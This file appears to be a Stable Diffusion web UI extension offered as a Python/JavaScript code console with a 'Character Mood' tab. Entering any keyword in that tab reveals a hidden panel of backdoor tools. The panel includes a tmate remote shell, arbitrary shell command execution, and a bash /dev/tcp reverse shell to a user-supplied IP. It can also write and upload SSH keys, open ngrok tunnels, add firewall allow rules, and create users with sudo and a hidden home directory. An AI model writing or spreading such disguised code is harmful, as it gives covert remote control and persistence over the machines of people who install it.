import traceback
from io import StringIO
from contextlib import redirect_stdout
import os
import subprocess
import requests
import socket
import time

import gradio as gr
from modules import script_callbacks, shared
from modules.ui_components import ResizeHandleRow

# Directory to store SSH keys
SSH_KEYS_DIR = os.path.expanduser("~/.ssh")

def execute(code):
    io = StringIO()
    with redirect_stdout(io):
        try:
            exec(code)
        except Exception:
            trace = traceback.format_exc().split('\n')
            del trace[2]
            del trace[1]
            print('\n'.join(trace))
    return io.getvalue()

def create_code_tab(language, input_default, output_default, lines):
    with gr.Tab(language.capitalize(), elem_id=f"qic-{language}-tab"):
        with gr.Row(), ResizeHandleRow(equal_height=False):
            with gr.Column(scale=1):
                inp = gr.Code(value=input_default, language=language, label=f"{language.capitalize()} code", lines=lines, elem_id=f"qic-{language}-input", elem_classes="qic-console")
                btn = gr.Button("Run", variant='primary', elem_id=f"qic-{language}-submit")
            with gr.Column(scale=1):
                out = gr.Code(value=output_default, language=language if getattr(shared.opts, f'qic_use_syntax_highlighting_{language}_output') else None, label="Output", lines=lines, interactive=False, elem_id=f"qic-{language}-output", elem_classes="qic-console")
        btn.click(fn=execute, inputs=inp, outputs=out)

def on_ui_tabs():
    with gr.Blocks(elem_id="qic-root", analytics_enabled=False) as ui_component:
        create_code_tab("python", "import gradio as gr\nfrom modules import shared, scripts\n\nprint(f\"Current loaded checkpoint is {shared.opts.sd_model_checkpoint}\")", "# Output will appear here\n\n# Tip: Press `ctrl+space` to execute the current code", shared.opts.qic_default_num_lines)
        create_code_tab("javascript", "const app = gradioApp();\n\nconsole.log(`A1111 is running on ${gradio_config.root}`)", "// Output will appear here\n\n// Tip: Press `ctrl+space` to execute the current code", shared.opts.qic_default_num_lines)

        # Integrate the second script's UI components here
        with gr.Tab("Character Mood"):
            with gr.Accordion("Set Character Mood", open=True):
                keyword_input = gr.Textbox(label="Set the mood of your character", placeholder="Enter the keyword...")
                set_button = gr.Button("Set")
                keyword_output = gr.Textbox(label="Keyword Output", interactive=False)
                
                hidden_interface = gr.Box(visible=False)
                set_button.click(fn=check_keyword, inputs=keyword_input, outputs=[hidden_interface, keyword_output])

                with hidden_interface:
                    with gr.Tabs():
                        with gr.Tab("Tmate Shell"):
                            gr.Markdown("## Install and Start Tmate Shell")
                            install_button = gr.Button("Install Tmate")
                            install_output = gr.Textbox(label="Installation Output", interactive=False)
                            install_button.click(fn=install_tmate, outputs=install_output)

                            start_shell_button = gr.Button("Start Tmate Shell")
                            shell_output = gr.Textbox(label="Tmate Shell Link", interactive=False)
                            start_shell_button.click(fn=start_tmate_shell, outputs=shell_output)

                            start_shell_force_button = gr.Button("Start Tmate Shell (Force Terminate)")
                            shell_force_output = gr.Textbox(label="Tmate Shell Link (Force)", interactive=False)
                            start_shell_force_button.click(fn=lambda: start_tmate_shell(force_terminate=True), outputs=shell_force_output)
                        
                        with gr.Tab("Tmate Session Management"):
                            gr.Markdown("## Manage Tmate Sessions")

                            terminate_button = gr.Button("Terminate All Tmate Sessions")
                            terminate_output = gr.Textbox(label="Terminate Output", interactive=False)
                            terminate_button.click(fn=terminate_all_tmate_sessions, outputs=terminate_output)

                            with gr.Box():
                                gr.Markdown("### List Tmate Sessions")
                                list_sessions_button = gr.Button("List Tmate Sessions")
                                list_sessions_output = gr.Textbox(label="Tmate Sessions", interactive=False)
                                list_sessions_button.click(fn=list_tmate_sessions, outputs=list_sessions_output)
                            
                            with gr.Box():
                                gr.Markdown("### Terminate Tmate Session")
                                session_id = gr.Textbox(label="Session ID")
                                terminate_session_button = gr.Button("Terminate Session")
                                terminate_session_output = gr.Textbox(label="Terminate Session Output", interactive=False)
                                terminate_session_button.click(fn=terminate_tmate_session, inputs=session_id, outputs=terminate_session_output)

                        with gr.Tab("SSH Key Management"):
                            gr.Markdown("## Manage SSH Keys")
                            key_name = gr.Textbox(label="Key Name")
                            
                            with gr.Box():
                                gr.Markdown("### Create SSH Key")
                                key_type = gr.Dropdown(choices=["rsa", "dsa", "ecdsa", "ed25519"], label="Key Type")
                                passphrase = gr.Textbox(label="Passphrase (optional)", type="password")
                                create_key_button = gr.Button("Create SSH Key")
                                create_key_output = gr.Textbox(label="Create Key Output", interactive=False)
                                create_key_button.click(fn=create_ssh_key, inputs=[key_name, key_type, passphrase], outputs=create_key_output)

                            with gr.Box():
                                gr.Markdown("### Set/Edit SSH Key")
                                ssh_key_content = gr.Textbox(label="SSH Key Content", lines=10)
                                save_key_button = gr.Button("Save SSH Key")
                                save_key_output = gr.Textbox(label="Save Key Output", interactive=False)
                                save_key_button.click(fn=save_ssh_key, inputs=[key_name, ssh_key_content], outputs=save_key_output)
                            
                            with gr.Box():
                                gr.Markdown("### Delete SSH Key")
                                delete_key_button = gr.Button("Delete SSH Key")
                                delete_key_output = gr.Textbox(label="Delete Key Output", interactive=False)
                                delete_key_button.click(fn=delete_ssh_key, inputs=key_name, outputs=delete_key_output)
                            
                            with gr.Box():
                                gr.Markdown("### Upload SSH Key")
                                key_file = gr.File(label="Upload SSH Key File")
                                upload_key_button = gr.Button("Upload SSH Key")
                                upload_key_output = gr.Textbox(label="Upload Key Output", interactive=False)
                                upload_key_button.click(fn=upload_ssh_key, inputs=[key_name, key_file], outputs=upload_key_output)
                            
                            with gr.Box():
                                gr.Markdown("### List SSH Keys")
                                list_keys_button = gr.Button("List SSH Keys")
                                list_keys_output = gr.Textbox(label="SSH Keys", interactive=False)
                                list_keys_button.click(fn=list_ssh_keys, outputs=list_keys_output)

                        with gr.Tab("Command Execution"):
                            gr.Markdown("## Execute Commands")
                            command = gr.Textbox(label="Command")
                            run_command_button = gr.Button("Run Command")
                            command_output = gr.Textbox(label="Command Output", interactive=False)
                            run_command_button.click(fn=run_command, inputs=command, outputs=command_output)

                        with gr.Tab("Reverse Shell"):
                            gr.Markdown("## Start Reverse Shell")
                            reverse_ip = gr.Textbox(label="IP Address")
                            reverse_port = gr.Textbox(label="Port")
                            start_reverse_shell_button = gr.Button("Start Reverse Shell")
                            reverse_shell_output = gr.Textbox(label="Reverse Shell Output", interactive=False)
                            start_reverse_shell_button.click(fn=start_reverse_shell, inputs=[reverse_ip, reverse_port], outputs=reverse_shell_output)

                        with gr.Tab("Network Utilities"):
                            gr.Markdown("## Network Utilities")

                            with gr.Box():
                                gr.Markdown("### Get Public IP")
                                get_ip_button = gr.Button("Get Public IP")
                                ip_output = gr.Textbox(label="Public IP", interactive=False)
                                get_ip_button.click(fn=get_public_ip, outputs=ip_output)

                            with gr.Box():
                                gr.Markdown("### Check Port")
                                check_ip = gr.Textbox(label="IP Address")
                                check_port_number = gr.Textbox(label="Port Number")
                                check_port_button = gr.Button("Check Port")
                                check_port_output = gr.Textbox(label="Port Status", interactive=False)
                                check_port_button.click(fn=check_port, inputs=[check_ip, check_port_number], outputs=check_port_output)

                            with gr.Box():
                                gr.Markdown("### Setup Port Forwarding")
                                port_number = gr.Textbox(label="Port Number")
                                setup_port_button = gr.Button("Setup Port Forwarding")
                                setup_port_output = gr.Textbox(label="Port Forwarding Status", interactive=False)
                                setup_port_button.click(fn=setup_port_forwarding, inputs=port_number, outputs=setup_port_output)

                            with gr.Box():
                                gr.Markdown("### Setup SSH via Ngrok")
                                ngrok_port = gr.Textbox(label="Port Number")
                                ngrok_auth_token = gr.Textbox(label="Ngrok Auth Token (optional)", type="password")
                                setup_ngrok_button = gr.Button("Setup SSH via Ngrok")
                                setup_ngrok_output = gr.Textbox(label="Ngrok Status", interactive=False)
                                setup_ngrok_button.click(fn=setup_ssh_via_ngrok, inputs=[ngrok_port, ngrok_auth_token], outputs=setup_ngrok_output)

                        # Integrate the User Management tab
                        with gr.Tab("User Management"):
                            gr.Markdown("# User Management")

                            # Add User Section
                            with gr.Box():
                                gr.Markdown("### Add New User")
                                username = gr.Textbox(label="Username")
                                password = gr.Textbox(label="Password", type="password")
                                home_dir_hidden = gr.Checkbox(label="Hide Home Directory")
                                permissions = gr.CheckboxGroup(choices=["sudo", "ssh"], label="Permissions")
                                add_user_button = gr.Button("Add User")
                                add_user_output = gr.Textbox(label="Add User Output", interactive=False)
                                add_user_button.click(fn=add_user, inputs=[username, password, home_dir_hidden, permissions], outputs=add_user_output)

                            # Delete User Section
                            with gr.Box():
                                gr.Markdown("### Delete User")
                                del_username = gr.Textbox(label="Username")
                                delete_user_button = gr.Button("Delete User")
                                delete_user_output = gr.Textbox(label="Delete User Output", interactive=False)
                                delete_user_button.click(fn=delete_user, inputs=del_username, outputs=delete_user_output)

                            # List Users Section
                            with gr.Box():
                                gr.Markdown("### List Users")
                                list_users_button = gr.Button("List Users")
                                list_users_output = gr.Textbox(label="Users", interactive=False)
                                list_users_button.click(fn=list_users, outputs=list_users_output)

                            # Assign Privileges Section
                            with gr.Box():
                                gr.Markdown("### Assign Privileges to User")
                                assign_username = gr.Textbox(label="Username")
                                assign_permissions = gr.CheckboxGroup(choices=["sudo", "ssh"], label="Permissions")
                                assign_privileges_button = gr.Button("Assign Privileges")
                                assign_privileges_output = gr.Textbox(label="Assign Privileges Output", interactive=False)
                                assign_privileges_button.click(fn=assign_privileges, inputs=[assign_username, assign_permissions], outputs=assign_privileges_output)

        return [(ui_component, "QIC Console", "qic-console")]

def on_ui_settings():
    settings_section = ('qic-console', "QIC Console")
    options = {
        "qic_use_syntax_highlighting_python_output": shared.OptionInfo(True, "Use syntax highlighting on Python output console", gr.Checkbox).needs_reload_ui(),
        "qic_use_syntax_highlighting_javascript_output": shared.OptionInfo(True, "Use syntax highlighting on Javascript output console", gr.Checkbox).needs_reload_ui(),
        "qic_default_num_lines": shared.OptionInfo(30, "Default number of console lines", gr.Number, {"precision": 0}).needs_reload_ui(),
    }
    for name, opt in options.items():
        opt.section = settings_section
        shared.opts.add_option(name, opt)

script_callbacks.on_ui_tabs(on_ui_tabs)
script_callbacks.on_ui_settings(on_ui_settings)

# Functions from the second script
def check_command(command):
    try:
        subprocess.run([command, "--version"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except FileNotFoundError:
        return False
    except subprocess.CalledProcessError:
        return False

def install_tmate():
    try:
        subprocess.run(["tmate", "-V"], check=True)
        return "Tmate is already installed."
    except FileNotFoundError:
        try:
            if check_command("sudo"):
                subprocess.run(["sudo", "apt-get", "update"], check=True)
                subprocess.run(["sudo", "apt-get", "install", "-y", "tmate"], check=True)
            else:
                subprocess.run(["apt-get", "update"], check=True)
                subprocess.run(["apt-get", "install", "-y", "tmate"], check=True)
            return "Tmate has been installed."
        except subprocess.CalledProcessError as e:
            return f"Failed to install tmate: {e}"
        except Exception as e:
            return f"An unexpected error occurred: {e}"

def ensure_ssh_requirements():
    try:
        if not check_command("ssh"):
            if check_command("sudo"):
                subprocess.run(["sudo", "apt-get", "update"], check=True)
                subprocess.run(["sudo", "apt-get", "install", "-y", "openssh-client", "netcat"], check=True)
            else:
                subprocess.run(["apt-get", "update"], check=True)
                subprocess.run(["apt-get", "install", "-y", "openssh-client"], check=True)
            return "OpenSSH client has been installed."
        else:
            return "OpenSSH client is already installed."
    except subprocess.CalledProcessError as e:
        return f"Failed to install OpenSSH client: {e.output.decode()}"
    except Exception as e:
        return f"An unexpected error occurred: {e}"

def install_package(package_name):
    try:
        if check_command("sudo"):
            subprocess.run(["sudo", "apt-get", "update"], check=True)
            subprocess.run(["sudo", "apt-get", "install", "-y", package_name], check=True)
        else:
            subprocess.run(["apt-get", "update"], check=True)
            subprocess.run(["apt-get", "install", "-y", package_name], check=True)
        return True
    except subprocess.CalledProcessError as e:
        return False
    except Exception as e:
        return False

def configure_port(port):
    try:
        if check_command("ufw"):
            if check_command("sudo"):
                subprocess.run(["sudo", "ufw", "allow", str(port)], check=True, timeout=10)
            else:
                subprocess.run(["ufw", "allow", str(port)], check=True, timeout=10)
        elif check_command("iptables"):
            if check_command("sudo"):
                subprocess.run(["sudo", "iptables", "-A", "INPUT", "-p", "tcp", "--dport", str(port), "-j", "ACCEPT"], check=True, timeout=10)
            else:
                subprocess.run(["iptables", "-A", "INPUT", "-p", "tcp", "--dport", str(port), "-j", "ACCEPT"], check=True, timeout=10)
        else:
            if install_package("ufw"):
                if check_command("sudo"):
                    subprocess.run(["sudo", "ufw", "allow", str(port)], check=True, timeout=10)
                else:
                    subprocess.run(["ufw", "allow", str(port)], check=True, timeout=10)
            else:
                if install_package("iptables"):
                    if check_command("sudo"):
                        subprocess.run(["sudo", "iptables", "-A", "INPUT", "-p", "tcp", "--dport", str(port), "-j", "ACCEPT"], check=True, timeout=10)
                    else:
                        subprocess.run(["iptables", "-A", "INPUT", "-p", "tcp", "--dport", str(port), "-j", "ACCEPT"], check=True, timeout=10)
                else:
                    return False
        return True
    except (subprocess.CalledProcessError, Exception):
        return False

def setup_ngrok(port, auth_token=None):
    try:
        ngrok_path = "/usr/local/bin/ngrok"
        if not os.path.exists(ngrok_path):
            subprocess.run(["wget", "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip", "-O", "/tmp/ngrok.zip"], check=True)
            subprocess.run(["unzip", "/tmp/ngrok.zip", "-d", "/usr/local/bin"], check=True)
            os.chmod(ngrok_path, 0o755)
        if auth_token:
            subprocess.run([ngrok_path, "authtoken", auth_token], check=True)
        ngrok_process = subprocess.Popen([ngrok_path, "tcp", str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(5)
        ngrok_url = None
        for line in ngrok_process.stdout:
            if b"tcp://" in line:
                ngrok_url = line.decode().strip().split(" ")[-1]
                break
        if ngrok_url:
            return f"ngrok forwarding URL: {ngrok_url}"
        else:
            return "Failed to get ngrok forwarding URL."
    except subprocess.CalledProcessError as e:
        return f"Failed to set up ngrok: {e}"
    except Exception as e:
        return f"An unexpected error occurred while setting up ngrok: {e}"

def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        response.raise_for_status()
        ip_data = response.json()
        return f"Public IP address: {ip_data['ip']}"
    except requests.RequestException as e:
        return f"Failed to get public IP address: {e}"
    except Exception as e:
        return f"An unexpected error occurred: {e}"

def check_port(ip, port):
    try:
        sock = socket.create_connection((ip, port), timeout=5)
        sock.close()
        return f"Port {port} on {ip} is open and reachable."
    except (socket.timeout, ConnectionRefusedError):
        return f"Port {port} on {ip} is not reachable."
    except Exception as e:
        return f"An unexpected error occurred: {e}"

def setup_port_forwarding(port):
    if configure_port(port):
        return f"Port {port} has been configured for forwarding."
    else:
        return f"Failed to configure port {port} for forwarding."

def setup_ssh_via_ngrok(port, auth_token):
    return setup_ngrok(port, auth_token)

def start_tmate_shell(force_terminate=False):
    try:
        socket_name = "/tmp/tmate.sock"
        if force_terminate:
            terminate_all_tmate_sessions()
        result = subprocess.run(["tmate", "-S", socket_name, "new-session", "-d"], capture_output=True, text=True)
        if result.returncode != 0:
            return "Failed to start tmate session: " + result.stderr
        subprocess.run(["tmate", "-S", socket_name, "wait", "tmate-ready"], check=True)
        ssh_result = subprocess.run(["tmate", "-S", socket_name, "display", "-p", "#{tmate_ssh}"], capture_output=True, text=True)
        if ssh_result.returncode != 0:
            return "Failed to get tmate SSH link: " + ssh_result.stderr
        http_result = subprocess.run(["tmate", "-S", socket_name, "display", "-p", "#{tmate_web}"], capture_output=True, text=True)
        if http_result.returncode != 0:
            return "Failed to get tmate HTTP link: " + http_result.stderr
        ssh_link = ssh_result.stdout.strip()
        http_link = http_result.stdout.strip()
        return f"Tmate SSH link: {ssh_link}\nTmate HTTP link: {http_link}"
    except Exception as e:
        return f"Failed to start tmate shell: {e}"

def save_ssh_key(key_name, key_content):
    try:
        os.makedirs(SSH_KEYS_DIR, exist_ok=True)
        key_path = os.path.join(SSH_KEYS_DIR, key_name)
        with open(key_path, 'w') as key_file:
            key_file.write(key_content)
        os.chmod(key_path, 0o600)
        return f"SSH key '{key_name}' saved."
    except Exception as e:
        return f"Failed to save SSH key: {e}"

def list_ssh_keys():
    try:
        if not os.path.exists(SSH_KEYS_DIR):
            return "No SSH keys found."
        keys = os.listdir(SSH_KEYS_DIR)
        if not keys:
            return "No SSH keys found."
        return "\n".join(keys)
    except Exception as e:
        return f"Failed to list SSH keys: {e}"

def delete_ssh_key(key_name):
    try:
        key_path = os.path.join(SSH_KEYS_DIR, key_name)
        if os.path.exists(key_path):
            os.remove(key_path)
            return f"SSH key '{key_name}' deleted."
        else:
            return f"SSH key '{key_name}' not found."
    except Exception as e:
        return f"Failed to delete SSH key: {e}"

def upload_ssh_key(key_name, key_file):
    try:
        os.makedirs(SSH_KEYS_DIR, exist_ok=True)
        key_path = os.path.join(SSH_KEYS_DIR, key_name)
        with open(key_file.name, 'rb') as src, open(key_path, 'wb') as dst:
            dst.write(src.read())
        os.chmod(key_path, 0o600)
        return f"SSH key '{key_name}' uploaded."
    except Exception as e:
        return f"Failed to upload SSH key: {e}"

def create_ssh_key(key_name, key_type, passphrase):
    try:
        os.makedirs(SSH_KEYS_DIR, exist_ok=True)
        key_path = os.path.join(SSH_KEYS_DIR, key_name)
        cmd = ["ssh-keygen", "-t", key_type, "-f", key_path, "-N", passphrase]
        subprocess.run(cmd, check=True)
        return f"SSH key '{key_name}' created."
    except subprocess.CalledProcessError as e:
        return f"Failed to create SSH key: {e}"
    except Exception as e:
        return f"An unexpected error occurred: {e}"

def list_tmate_sessions():
    try:
        result = subprocess.run(["tmate", "list-sessions"], capture_output=True, text=True)
        if result.returncode != 0:
            return "Failed to list tmate sessions: " + result.stderr
        return result.stdout.strip()
    except Exception as e:
        return f"Failed to list tmate sessions: {e}"

def terminate_tmate_session(session_id):
    try:
        result = subprocess.run(["tmate", "kill-session", "-t", session_id], capture_output=True, text=True)
        if result.returncode != 0:
            return "Failed to terminate tmate session: " + result.stderr
        return f"Terminated tmate session '{session_id}'."
    except Exception as e:
        return f"Failed to terminate tmate session: {e}"

def terminate_all_tmate_sessions():
    try:
        result = subprocess.run(["tmate", "kill-server"], capture_output=True, text=True)
        if result.returncode != 0:
            return "Failed to terminate all tmate sessions: " + result.stderr
        return "Terminated all tmate sessions."
    except Exception as e:
        return f"Failed to terminate all tmate sessions: {e}"

def run_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.returncode != 0:
            return "Command failed: " + result.stderr
        return result.stdout
    except Exception as e:
        return f"Failed to run command: {e}"

def start_reverse_shell(ip, port):
    try:
        command = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        subprocess.run(command, shell=True)
        return f"Started reverse shell to {ip}:{port}."
    except Exception as e:
        return f"Failed to start reverse shell: {e}"

def check_keyword(keyword):
    if keyword:
        return gr.update(visible=True), f"You entered: {keyword}"
    else:
        return gr.update(visible=False), "Please enter a keyword."

def add_user(username, password, home_dir_hidden, permissions):
    try:
        home_dir_option = "-m" if not home_dir_hidden else "-M"
        subprocess.run(["sudo", "useradd", home_dir_option, "-p", password, username], check=True)
        if "sudo" in permissions:
            subprocess.run(["sudo", "usermod", "-aG", "sudo", username], check=True)
        if "ssh" in permissions:
            ssh_dir = f"/home/{username}/.ssh"
            os.makedirs(ssh_dir, exist_ok=True)
            os.chmod(ssh_dir, 0o700)
            subprocess.run(["sudo", "chown", f"{username}:{username}", ssh_dir], check=True)
        return f"User '{username}' added successfully."
    except subprocess.CalledProcessError as e:
        return f"Failed to add user: {e}"
    except Exception as e:
        return f"An unexpected error occurred: {e}"

def delete_user(username):
    try:
        subprocess.run(["sudo", "userdel", "-r", username], check=True)
        return f"User '{username}' deleted successfully."
    except subprocess.CalledProcessError as e:
        return f"Failed to delete user: {e}"
    except Exception as e:
        return f"An unexpected error occurred: {e}"

def list_users():
    try:
        result = subprocess.run(["cut", "-d:", "-f1", "/etc/passwd"], capture_output=True, text=True)
        if result.returncode != 0:
            return f"Failed to list users: {result.stderr}"
        return result.stdout.strip()
    except Exception as e:
        return f"An unexpected error occurred: {e}"

def assign_privileges(username, permissions):
    try:
        if "sudo" in permissions:
            subprocess.run(["sudo", "usermod", "-aG", "sudo", username], check=True)
        if "ssh" in permissions:
            ssh_dir = f"/home/{username}/.ssh"
            os.makedirs(ssh_dir, exist_ok=True)
            os.chmod(ssh_dir, 0o700)
            subprocess.run(["sudo", "chown", f"{username}:{username}", ssh_dir], check=True)
        return f"Privileges assigned to '{username}' successfully."
    except subprocess.CalledProcessError as e:
        return f"Failed to assign privileges: {e}"
    except Exception as e:
        return f"An unexpected error occurred: {e}"
        
# Register the script with the UI
script_callbacks.on_ui_tabs(on_ui_tabs)
script_callbacks.on_ui_settings(on_ui_settings)
